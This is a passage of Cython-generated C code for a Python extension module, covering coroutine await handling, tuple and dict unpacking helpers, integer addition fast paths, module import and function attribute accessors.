    __pyx_Coroutine_getsets,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if CYTHON_USE_TP_FINALIZE
    0,
#else
    __Pyx_Coroutine_del,
#endif
    0,
#if CYTHON_USE_TP_FINALIZE
    __Pyx_Coroutine_del,
#elif PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_Coroutine_init(void) {
    __pyx_CoroutineType_type.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
    __pyx_CoroutineType = __Pyx_FetchCommonType(&__pyx_CoroutineType_type);
    if (unlikely(!__pyx_CoroutineType))
        return -1;
#ifdef __Pyx_IterableCoroutine_USED
    if (unlikely(__pyx_IterableCoroutine_init() == -1))
        return -1;
#endif
    __pyx_CoroutineAwaitType = __Pyx_FetchCommonType(&__pyx_CoroutineAwaitType_type);
    if (unlikely(!__pyx_CoroutineAwaitType))
        return -1;
    return 0;
}

/* GetAwaitIter */
static CYTHON_INLINE PyObject *__Pyx_Coroutine_GetAwaitableIter(PyObject *o) {
#ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(o)) {
        return __Pyx_NewRef(o);
    }
#endif
    return __Pyx__Coroutine_GetAwaitableIter(o);
}
static void __Pyx_Coroutine_AwaitableIterError(PyObject *source) {
#if PY_VERSION_HEX >= 0x030600B3 || defined(_PyErr_FormatFromCause)
    _PyErr_FormatFromCause(
        PyExc_TypeError,
        "'async for' received an invalid object "
        "from __anext__: %.100s",
        Py_TYPE(source)->tp_name);
#elif PY_MAJOR_VERSION >= 3
    PyObject *exc, *val, *val2, *tb;
    assert(PyErr_Occurred());
    PyErr_Fetch(&exc, &val, &tb);
    PyErr_NormalizeException(&exc, &val, &tb);
    if (tb != NULL) {
        PyException_SetTraceback(val, tb);
        Py_DECREF(tb);
    }
    Py_DECREF(exc);
    assert(!PyErr_Occurred());
    PyErr_Format(
        PyExc_TypeError,
        "'async for' received an invalid object "
        "from __anext__: %.100s",
        Py_TYPE(source)->tp_name);
    PyErr_Fetch(&exc, &val2, &tb);
    PyErr_NormalizeException(&exc, &val2, &tb);
    Py_INCREF(val);
    PyException_SetCause(val2, val);
    PyException_SetContext(val2, val);
    PyErr_Restore(exc, val2, tb);
#else
    source++;
#endif
}
static PyObject *__Pyx__Coroutine_GetAwaitableIter(PyObject *obj) {
    PyObject *res;
#if CYTHON_USE_ASYNC_SLOTS
    __Pyx_PyAsyncMethodsStruct* am = __Pyx_PyType_AsAsync(obj);
    if (likely(am && am->am_await)) {
        res = (*am->am_await)(obj);
    } else
#endif
#if PY_VERSION_HEX >= 0x030500B2 || defined(PyCoro_CheckExact)
    if (PyCoro_CheckExact(obj)) {
        return __Pyx_NewRef(obj);
    } else
#endif
#if CYTHON_COMPILING_IN_CPYTHON && defined(CO_ITERABLE_COROUTINE)
    if (PyGen_CheckExact(obj) && ((PyGenObject*)obj)->gi_code && ((PyCodeObject *)((PyGenObject*)obj)->gi_code)->co_flags & CO_ITERABLE_COROUTINE) {
        return __Pyx_NewRef(obj);
    } else
#endif
    {
        PyObject *method = NULL;
        int is_method = __Pyx_PyObject_GetMethod(obj, __pyx_n_s_await, &method);
        if (likely(is_method)) {
            res = __Pyx_PyObject_CallOneArg(method, obj);
        } else if (likely(method)) {
            res = __Pyx_PyObject_CallNoArg(method);
        } else
            goto slot_error;
        Py_DECREF(method);
    }
    if (unlikely(!res)) {
        __Pyx_Coroutine_AwaitableIterError(obj);
        goto bad;
    }
    if (unlikely(!PyIter_Check(res))) {
        PyErr_Format(PyExc_TypeError,
                     "__await__() returned non-iterator of type '%.100s'",
                     Py_TYPE(res)->tp_name);
        Py_CLEAR(res);
    } else {
        int is_coroutine = 0;
        #ifdef __Pyx_Coroutine_USED
        is_coroutine |= __Pyx_Coroutine_Check(res);
        #endif
        #if PY_VERSION_HEX >= 0x030500B2 || defined(PyCoro_CheckExact)
        is_coroutine |= PyCoro_CheckExact(res);
        #endif
        if (unlikely(is_coroutine)) {
            /* __await__ must return an *iterator*, not
               a coroutine or another awaitable (see PEP 492) */
            PyErr_SetString(PyExc_TypeError,
                            "__await__() returned a coroutine");
            Py_CLEAR(res);
        }
    }
    return res;
slot_error:
    PyErr_Format(PyExc_TypeError,
                 "object %.100s can't be used in 'await' expression",
                 Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* CoroutineYieldFrom */
static PyObject* __Pyx__Coroutine_Yield_From_Generic(__pyx_CoroutineObject *gen, PyObject *source) {
    PyObject *retval;
    PyObject *source_gen = __Pyx__Coroutine_GetAwaitableIter(source);
    if (unlikely(!source_gen)) {
        return NULL;
    }
    if (__Pyx_Coroutine_Check(source_gen)) {
        retval = __Pyx_Generator_Next(source_gen);
    } else {
#if CYTHON_USE_TYPE_SLOTS
        retval = Py_TYPE(source_gen)->tp_iternext(source_gen);
#else
        retval = PyIter_Next(source_gen);
#endif
    }
    if (retval) {
        gen->yieldfrom = source_gen;
        return retval;
    }
    Py_DECREF(source_gen);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_Coroutine_Yield_From(__pyx_CoroutineObject *gen, PyObject *source) {
    PyObject *retval;
    if (__Pyx_Coroutine_Check(source)) {
        if (unlikely(((__pyx_CoroutineObject*)source)->yieldfrom)) {
            PyErr_SetString(
                PyExc_RuntimeError,
                "coroutine is being awaited already");
            return NULL;
        }
        retval = __Pyx_Generator_Next(source);
#ifdef __Pyx_AsyncGen_USED
    } else if (__pyx_PyAsyncGenASend_CheckExact(source)) {
        retval = __Pyx_async_gen_asend_iternext(source);
#endif
    } else {
        return __Pyx__Coroutine_Yield_From_Generic(gen, source);
    }
    if (retval) {
        Py_INCREF(source);
        gen->yieldfrom = source;
    }
    return retval;
}

/* IterFinish */
static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject *exc_value, *exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#endif
}

/* PyObjectCallMethod0 */
static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name) {
    PyObject *method = NULL, *result = NULL;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_CallOneArg(method, obj);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) goto bad;
    result = __Pyx_PyObject_CallNoArg(method);
    Py_DECREF(method);
bad:
    return result;
}

/* RaiseNeedMoreValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}

/* RaiseTooManyValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}

/* UnpackItemEndCheck */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    return __Pyx_IterFinish();
}

/* RaiseNoneIterError */
static CYTHON_INLINE void __Pyx_RaiseNoneNotIterableError(void) {
    PyErr_SetString(PyExc_TypeError, "'NoneType' object is not iterable");
}

/* UnpackTupleError */
static void __Pyx_UnpackTupleError(PyObject *t, Py_ssize_t index) {
    if (t == Py_None) {
      __Pyx_RaiseNoneNotIterableError();
    } else if (PyTuple_GET_SIZE(t) < index) {
      __Pyx_RaiseNeedMoreValuesError(PyTuple_GET_SIZE(t));
    } else {
      __Pyx_RaiseTooManyValuesError(index);
    }
}

/* UnpackTuple2 */
static CYTHON_INLINE int __Pyx_unpack_tuple2_exact(
        PyObject* tuple, PyObject** pvalue1, PyObject** pvalue2, int decref_tuple) {
    PyObject *value1 = NULL, *value2 = NULL;
#if CYTHON_COMPILING_IN_PYPY
    value1 = PySequence_ITEM(tuple, 0);  if (unlikely(!value1)) goto bad;
    value2 = PySequence_ITEM(tuple, 1);  if (unlikely(!value2)) goto bad;
#else
    value1 = PyTuple_GET_ITEM(tuple, 0);  Py_INCREF(value1);
    value2 = PyTuple_GET_ITEM(tuple, 1);  Py_INCREF(value2);
#endif
    if (decref_tuple) {
        Py_DECREF(tuple);
    }
    *pvalue1 = value1;
    *pvalue2 = value2;
    return 0;
#if CYTHON_COMPILING_IN_PYPY
bad:
    Py_XDECREF(value1);
    Py_XDECREF(value2);
    if (decref_tuple) { Py_XDECREF(tuple); }
    return -1;
#endif
}
static int __Pyx_unpack_tuple2_generic(PyObject* tuple, PyObject** pvalue1, PyObject** pvalue2,
                                       int has_known_size, int decref_tuple) {
    Py_ssize_t index;
    PyObject *value1 = NULL, *value2 = NULL, *iter = NULL;
    iternextfunc iternext;
    iter = PyObject_GetIter(tuple);
    if (unlikely(!iter)) goto bad;
    if (decref_tuple) { Py_DECREF(tuple); tuple = NULL; }
    iternext = Py_TYPE(iter)->tp_iternext;
    value1 = iternext(iter); if (unlikely(!value1)) { index = 0; goto unpacking_failed; }
    value2 = iternext(iter); if (unlikely(!value2)) { index = 1; goto unpacking_failed; }
    if (!has_known_size && unlikely(__Pyx_IternextUnpackEndCheck(iternext(iter), 2))) goto bad;
    Py_DECREF(iter);
    *pvalue1 = value1;
    *pvalue2 = value2;
    return 0;
unpacking_failed:
    if (!has_known_size && __Pyx_IterFinish() == 0)
        __Pyx_RaiseNeedMoreValuesError(index);
bad:
    Py_XDECREF(iter);
    Py_XDECREF(value1);
    Py_XDECREF(value2);
    if (decref_tuple) { Py_XDECREF(tuple); }
    return -1;
}

/* dict_iter */
static CYTHON_INLINE PyObject* __Pyx_dict_iterator(PyObject* iterable, int is_dict, PyObject* method_name,
                                                   Py_ssize_t* p_orig_length, int* p_source_is_dict) {
    is_dict = is_dict || likely(PyDict_CheckExact(iterable));
    *p_source_is_dict = is_dict;
    if (is_dict) {
#if !CYTHON_COMPILING_IN_PYPY
        *p_orig_length = PyDict_Size(iterable);
        Py_INCREF(iterable);
        return iterable;
#elif PY_MAJOR_VERSION >= 3
        static PyObject *py_items = NULL, *py_keys = NULL, *py_values = NULL;
        PyObject **pp = NULL;
        if (method_name) {
            const char *name = PyUnicode_AsUTF8(method_name);
            if (strcmp(name, "iteritems") == 0) pp = &py_items;
            else if (strcmp(name, "iterkeys") == 0) pp = &py_keys;
            else if (strcmp(name, "itervalues") == 0) pp = &py_values;
            if (pp) {
                if (!*pp) {
                    *pp = PyUnicode_FromString(name + 4);
                    if (!*pp)
                        return NULL;
                }
                method_name = *pp;
            }
        }
#endif
    }
    *p_orig_length = 0;
    if (method_name) {
        PyObject* iter;
        iterable = __Pyx_PyObject_CallMethod0(iterable, method_name);
        if (!iterable)
            return NULL;
#if !CYTHON_COMPILING_IN_PYPY
        if (PyTuple_CheckExact(iterable) || PyList_CheckExact(iterable))
            return iterable;
#endif
        iter = PyObject_GetIter(iterable);
        Py_DECREF(iterable);
        return iter;
    }
    return PyObject_GetIter(iterable);
}
static CYTHON_INLINE int __Pyx_dict_iter_next(
        PyObject* iter_obj, CYTHON_NCP_UNUSED Py_ssize_t orig_length, CYTHON_NCP_UNUSED Py_ssize_t* ppos,
        PyObject** pkey, PyObject** pvalue, PyObject** pitem, int source_is_dict) {
    PyObject* next_item;
#if !CYTHON_COMPILING_IN_PYPY
    if (source_is_dict) {
        PyObject *key, *value;
        if (unlikely(orig_length != PyDict_Size(iter_obj))) {
            PyErr_SetString(PyExc_RuntimeError, "dictionary changed size during iteration");
            return -1;
        }
        if (unlikely(!PyDict_Next(iter_obj, ppos, &key, &value))) {
            return 0;
        }
        if (pitem) {
            PyObject* tuple = PyTuple_New(2);
            if (unlikely(!tuple)) {
                return -1;
            }
            Py_INCREF(key);
            Py_INCREF(value);
            PyTuple_SET_ITEM(tuple, 0, key);
            PyTuple_SET_ITEM(tuple, 1, value);
            *pitem = tuple;
        } else {
            if (pkey) {
                Py_INCREF(key);
                *pkey = key;
            }
            if (pvalue) {
                Py_INCREF(value);
                *pvalue = value;
            }
        }
        return 1;
    } else if (PyTuple_CheckExact(iter_obj)) {
        Py_ssize_t pos = *ppos;
        if (unlikely(pos >= PyTuple_GET_SIZE(iter_obj))) return 0;
        *ppos = pos + 1;
        next_item = PyTuple_GET_ITEM(iter_obj, pos);
        Py_INCREF(next_item);
    } else if (PyList_CheckExact(iter_obj)) {
        Py_ssize_t pos = *ppos;
        if (unlikely(pos >= PyList_GET_SIZE(iter_obj))) return 0;
        *ppos = pos + 1;
        next_item = PyList_GET_ITEM(iter_obj, pos);
        Py_INCREF(next_item);
    } else
#endif
    {
        next_item = PyIter_Next(iter_obj);
        if (unlikely(!next_item)) {
            return __Pyx_IterFinish();
        }
    }
    if (pitem) {
        *pitem = next_item;
    } else if (pkey && pvalue) {
        if (__Pyx_unpack_tuple2(next_item, pkey, pvalue, source_is_dict, source_is_dict, 1))
            return -1;
    } else if (pkey) {
        *pkey = next_item;
    } else {
        *pvalue = next_item;
    }
    return 1;
}

/* ObjectGetItem */
#if CYTHON_USE_TYPE_SLOTS
static PyObject *__Pyx_PyObject_GetIndex(PyObject *obj, PyObject* index) {
    PyObject *runerr = NULL;
    Py_ssize_t key_value;
    PySequenceMethods *m = Py_TYPE(obj)->tp_as_sequence;
    if (unlikely(!(m && m->sq_item))) {
        PyErr_Format(PyExc_TypeError, "'%.200s' object is not subscriptable", Py_TYPE(obj)->tp_name);
        return NULL;
    }
    key_value = __Pyx_PyIndex_AsSsize_t(index);
    if (likely(key_value != -1 || !(runerr = PyErr_Occurred()))) {
        return __Pyx_GetItemInt_Fast(obj, key_value, 0, 1, 1);
    }
    if (PyErr_GivenExceptionMatches(runerr, PyExc_OverflowError)) {
        PyErr_Clear();
        PyErr_Format(PyExc_IndexError, "cannot fit '%.200s' into an index-sized integer", Py_TYPE(index)->tp_name);
    }
    return NULL;
}
static PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject* key) {
    PyMappingMethods *m = Py_TYPE(obj)->tp_as_mapping;
    if (likely(m && m->mp_subscript)) {
        return m->mp_subscript(obj, key);
    }
    return __Pyx_PyObject_GetIndex(obj, key);
}
#endif

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
